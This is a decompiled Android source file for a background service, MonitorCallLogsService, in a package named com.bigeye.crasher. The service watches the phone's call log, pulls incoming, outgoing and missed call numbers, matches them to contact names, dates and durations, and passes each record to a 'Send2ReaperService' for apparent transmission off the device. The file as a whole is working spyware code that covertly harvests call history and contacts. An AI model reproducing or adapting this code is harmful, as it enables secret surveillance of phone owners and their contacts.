package com.bigeye.crasher;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.provider.CallLog;
import android.text.format.DateFormat;
import android.util.Log;
/* loaded from: classes.dex */
public class MonitorCallLogsService extends Service {
    public String APP_TAG = "MonitorCallLogsService";
    ContentObserver callLogContentObserver;
    ContentResolver contentResolver;

    @Override // android.app.Service
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(this.APP_TAG, "Starting call log service ...");
        return 1;
    }

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
        this.contentResolver = getContentResolver();
        this.callLogContentObserver = new ContentObserver(new Handler()) { // from class: com.bigeye.crasher.MonitorCallLogsService.1
            @Override // android.database.ContentObserver
            public void onChange(boolean selfChange) {
                Uri logURI = Uri.parse("content://call_log/calls");
                String[] selection = {"type = 1 AND new = 1", "type = 2", "type = 3 AND new = 1"};
                Cursor[] c = {MonitorCallLogsService.this.getContentResolver().query(logURI, null, selection[0], null, null), MonitorCallLogsService.this.getContentResolver().query(logURI, null, selection[1], null, "date DESC LIMIT 1"), MonitorCallLogsService.this.getContentResolver().query(logURI, null, selection[2], null, null)};
                for (Cursor cursor : c) {
                    if (cursor.getCount() > 0) {
                        cursor.moveToFirst();
                        String phoneNo = cursor.getString(cursor.getColumnIndex("number"));
                        String name = new ReadContacts(MonitorCallLogsService.this.getApplicationContext()).getContactName(phoneNo);
                        if (name == "") {
                            name = "unknown";
                        }
                        long CDate = cursor.getLong(cursor.getColumnIndex("date"));
                        new DateFormat();
                        String callDate = DateFormat.format("dd-MMM-yyyy k:m:s", CDate).toString();
                        String duration = cursor.getString(cursor.getColumnIndex("duration"));
                        String callType = cursor.getString(cursor.getColumnIndex("type"));
                        String callLog = "";
                        if (callType.equalsIgnoreCase(String.valueOf(1))) {
                            callLog = "New Incoming call from: <" + name + ">" + phoneNo;
                        } else if (callType.equalsIgnoreCase(String.valueOf(2))) {
                            callLog = "New Outgoing call to: <" + name + ">" + phoneNo;
                        } else if (callType.equalsIgnoreCase(String.valueOf(3))) {
                            callLog = "New Missed call from: <" + name + ">" + phoneNo;
                        }
                        String callLog2 = callLog + " on " + callDate + " duration: " + duration + " secs.";
                        Log.i(MonitorCallLogsService.this.APP_TAG, callLog2);
                        Intent repo = new Intent(MonitorCallLogsService.this.getApplicationContext(), Send2ReaperService.class);
                        repo.putExtra("OPERATION", "OUTGOING");
                        repo.putExtra("MSG", callLog2);
                        MonitorCallLogsService.this.startService(repo);
                    } else {
                        Log.i(MonitorCallLogsService.this.APP_TAG, "count: " + cursor.getCount());
                    }
                    cursor.close();
                }
            }

            @Override // android.database.ContentObserver
            public boolean deliverSelfNotifications() {
                return true;
            }
        };
        this.contentResolver.registerContentObserver(CallLog.Calls.CONTENT_URI, true, this.callLogContentObserver);
    }

    @Override // android.app.Service
    public void onDestroy() {
        super.onDestroy();
    }
}
